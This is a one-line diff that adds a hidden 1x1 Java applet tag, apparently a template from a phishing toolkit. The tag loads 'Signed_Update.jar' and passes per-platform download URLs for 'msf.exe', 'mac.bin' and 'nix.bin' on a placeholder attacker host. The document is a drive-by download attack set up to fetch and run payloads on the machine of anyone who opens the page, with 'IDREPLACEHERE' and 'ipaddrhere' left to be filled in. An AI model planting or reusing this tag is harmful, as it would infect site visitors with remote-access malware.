@@ -1,0 +1,1 @@
+<applet width="1" height="1" id="IDREPLACEHERE" code="Java.class" archive="Signed_Update.jar"><param name="WIN" value="http://ipaddrhere/msf.exe"><param name="MAC" value="http://ipaddrhere/mac.bin"><param name="NIX" value="http://ipaddrhere/nix.bin"><param name="nextPage" value="ITSOKITSOKITSOK"><param name="separate_jvm" value="true"/></applet>
